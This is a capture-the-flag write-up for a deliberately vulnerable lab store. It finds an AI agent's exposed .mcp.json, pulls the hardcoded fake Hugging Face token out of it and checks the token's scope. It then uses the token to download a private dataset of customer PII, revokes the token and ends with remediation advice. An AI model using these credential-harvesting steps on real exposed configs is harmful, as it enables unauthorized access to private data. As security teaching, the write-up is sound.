---
author: kOaDT
authorGithubUrl: https://github.com/kOaDT
authorGithubAvatar: https://avatars.githubusercontent.com/u/17499022?v=4
pubDatetime: 2026-11-09T12:00:00Z
title: "Exposed MCP Config: Triaging a Leaked Hugging Face Token"
slug: exposed-mcp-config
draft: false
tags:
  - writeup
  - information-disclosure
  - mcp
  - ai
  - ctf
description: Finding an AI agent's MCP config in the web root, working out what its Hugging Face token opens, reading a private dataset with the official Hub client, then revoking the token.
---

The storefront was deployed from a developer's checkout, dotfiles included. Next to the code sat the config of the developer's AI coding agent, and that file hardcodes a Hugging Face token. Finding the token is the easy part. This challenge is about what comes next: who it belongs to, what it opens, and how to kill it.

## Table of contents

## Lab setup

From an empty directory:

```bash
npx create-oss-store oss-store
cd oss-store
npm start
```

Or with Docker (no Node.js required):

```bash
docker run -p 127.0.0.1:3000:3000 leogra/oss-oopssec-store
```

The app runs at `http://localhost:3000`.

## Discovery

### What else ships with a checkout

A deployment that copies the working copy copies every dotfile in it. Besides `.git` and `.env*`, a checkout can hold the config of an AI coding agent. Claude Code reads project MCP servers from `.mcp.json` at the root of the repository, and VS Code reads that portable file too, next to its own `.vscode/mcp.json`. Even the [README of Hugging Face's own MCP server](https://github.com/huggingface/hf-mcp-server#installing-the-mcp-server) offers, for a manual setup, an `mcp.json` snippet with the token in clear.

**In practice, it's a very bad idea to keep that token in plain text**: once that file sits in a project, the token travels with every copy of it, this deployment included.

### Scanning for it

The usual wordlists miss it: SecLists' `Discovery/Web-Content/common.txt` and `quickhits.txt` have no `mcp.json` entry. nuclei has templates for exactly this file. `vscode-mcp-json` requests `/mcp.json` and `/.mcp.json` and matches an `mcpServers` object with an `args` key, and `claude-settings-exposure` probes `/.mcp.json` too:

```bash
nuclei -u http://localhost:3000 -id vscode-mcp-json,claude-settings-exposure
```

```
[vscode-mcp-json] [http] [low] http://localhost:3000/.mcp.json
[claude-settings-exposure] [http] [medium] http://localhost:3000/.mcp.json
```

Both templates hit the same file. Read it:

```bash
curl http://localhost:3000/.mcp.json
```

```
{
  "mcpServers": {
    "hf-mcp-server": {
      "command": "npx",
      "args": [
        "-y",
        "@llmindset/hf-mcp-server"
      ],
      "env": {
        "HF_TOKEN": "hf_SuRr…"
      }
    },
    "support-evals": {
      "command": "uv",
      "args": [
        "run",
        "--directory",
        "tools/support-evals",
        "server.py"
      ],
      "env": {
        "HF_ENDPOINT": "http://localhost:3000/hf-mirror",
        "HF_TOKEN": "hf_SuRr…"
      }
    }
  }
}
```

The token is truncated here; yours is the full 37 characters. It's a fake token, derived from a fixed seed, so every install serves the same one.

## Triage

> **Outside the lab, stop at the prefix.** Using a token you found, even for a `whoami`, means using someone else's credential, which can amount to unauthorized access under computer-crime laws.

### Which provider

The `hf_` prefix and the 34 letters after it make a Hugging Face user access token. The variable names agree: `HF_TOKEN` is what the Hugging Face libraries and the official Hugging Face MCP server (`@llmindset/hf-mcp-server`) read.

### Which endpoint

The second server also sets `HF_ENDPOINT`. `huggingface_hub` sends every request to that URL instead of `https://huggingface.co`, which is how companies route Hub traffic through a mirror or a proxy. Here, it is the store's own Hub mirror, and that is where the token works.

> In the lab, the real Hugging Face Hub has never heard of it.

Put both values in your environment, with an empty `HF_HOME`. If `HF_TOKEN` comes out empty, say because `jq` is missing, the client falls back on the token you saved with `hf auth login` and sends it to whatever `HF_ENDPOINT` names. That's harmless on localhost, but pointing `HF_ENDPOINT` at a mirror you don't trust hands it your token.

```bash
export HF_HOME=$(mktemp -d)
export HF_ENDPOINT=http://localhost:3000/hf-mirror
export HF_TOKEN=$(curl -s http://localhost:3000/.mcp.json | jq -r '.mcpServers["support-evals"].env.HF_TOKEN')
```

### Who owns it

Install the official client in a virtualenv, in a working directory of its own. It reads `HF_ENDPOINT` and `HF_TOKEN` from the environment.

> The version is pinned: the lab's mirror reproduces the calls `huggingface_hub` 2.4.0 makes, and a newer release may call endpoints it doesn't have, so ignore `hf` if it suggests an update.

```bash
mkdir -p ~/loot && cd ~/loot
python3 -m venv venv
venv/bin/pip install huggingface_hub==2.4.0
venv/bin/hf auth whoami
```

```
✓ Logged in
  user: vdessendre
  orgs: oopssec-store
  endpoint: http://localhost:3000/hf-mirror
```

The token belongs to Verso Dessendre, a member of the `oopssec-store` organization. `hf auth whoami` stops there. The token's scope is in the raw response of the endpoint it calls, `/api/whoami-v2`:

```bash
curl -s "$HF_ENDPOINT/api/whoami-v2" -H "Authorization: Bearer $HF_TOKEN" \
  | jq '{name, fullname, email, orgs: [.orgs[] | {name, roleInOrg}], auth}'
```

```
{
  "name": "vdessendre",
  "fullname": "Verso Dessendre",
  "email": "verso.dessendre@oss.com",
  "orgs": [
    {
      "name": "oopssec-store",
      "roleInOrg": "write"
    }
  ],
  "auth": {
    "type": "access_token",
    "accessToken": {
      "displayName": "support-evals",
      "role": "fineGrained",
      "createdAt": "2026-01-12T09:41:27.512Z",
      "fineGrained": {
        "canReadGatedRepos": false,
        "global": [],
        "scoped": [
          {
            "entity": {
              "_id": "695fd9d1e7a24c08b9f3165d",
              "type": "dataset",
              "name": "oopssec-store/support-chat-transcripts"
            },
            "permissions": [
              "repo.content.read"
            ]
          }
        ]
      }
    }
  }
}
```

A fine-grained token named after the `support-evals` tool, with read access to one dataset: `oopssec-store/support-chat-transcripts`. Its owner can write to the organization, the token cannot. That is the blast radius, and it is still a private dataset of customer conversations.

## Reading the dataset

Still from `~/loot`:

```bash
venv/bin/hf download oopssec-store/support-chat-transcripts \
  --repo-type dataset --local-dir transcripts
```

```
✓ Downloaded
  path: ~/loot/transcripts
```

The dataset card says what's inside, and what should not be:

```bash
tail -1 transcripts/README.md
```

```
> **Not scrubbed yet.** Customer names, emails, phone numbers and delivery addresses are still in clear. Keep this repo private until the PII pass lands.
```

`data/train.jsonl` holds one support conversation per line, in the chat format fine-tuning jobs expect. One of them is a double-charge escalation, and the agent gave the customer a case reference:

```bash
grep -o 'OSS{[^}]*}' transcripts/data/train.jsonl
```

```
OSS{mcp_c0nf1g_l34ks_hf_t0k3n}
```

The same record carries the customer's full identity, like the nine others:

```bash
jq -c 'select(.conversation_id == "conv_10271") | {conversation_id, customer}' transcripts/data/train.jsonl
```

```
{"conversation_id":"conv_10271","customer":{"name":"Marcus Bell","email":"marcus.bell@example.com","phone":"+1 202-555-0147","address":"88 Juniper Street, Portland, OR 97209, United States"}}
```

The flag is `OSS{mcp_c0nf1g_l34ks_hf_t0k3n}`.

## Revoking the token

You don't need the owner's account to kill a Hugging Face token you found. `POST /api/credentials/revoke` takes the raw value, needs no authentication, and always answers `202`, whether the token existed or not, so it can't be used to test a token:

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X POST "$HF_ENDPOINT/api/credentials/revoke" \
  -H "Content-Type: application/json" \
  -d "{\"credentials\": [\"$HF_TOKEN\"]}"
```

```
202
```

On the real Hub, the token stops working everywhere and its owner gets an email. Same here:

```bash
venv/bin/hf auth whoami
```

```
Error: Invalid user token. The token from HF_TOKEN environment variable is invalid. Note that HF_TOKEN takes precedence over `hf auth login`.
```

> Revoke last in the lab only: it locks you out as well. In the lab, `npm run db:upgrade` hands the token back; with Docker, restart the container, its entrypoint replays the challenge data on start.

## Vulnerability chain

1. CWE-538: the deployment copies the checkout, `.mcp.json` included, into the web root.
2. CWE-798: the MCP config hardcodes a Hugging Face token instead of referencing an environment variable.
3. CWE-359: the dataset the token reads holds customer personal data that was never scrubbed.

## Remediation

Deploy build artifacts, not checkouts, and have the reverse proxy return 404 for any path segment that starts with a dot, keeping `/.well-known/` open.

Keep tokens out of MCP configs. Claude Code expands environment variables in `.mcp.json`, so `"HF_TOKEN": "${HF_TOKEN}"` keeps the value in the developer's environment. In `.vscode/mcp.json`, VS Code can prompt for it through an `inputs` entry with `password: true`.

Give each tool its own fine-grained token, scoped to what it needs. It did not prevent this leak, but it kept it to one dataset.

Revoke and rotate as soon as a token is exposed. Deleting `.mcp.json` from the server afterwards does not un-leak the token.

Scrub personal data before it reaches a dataset. Private is one leaked token away from public.
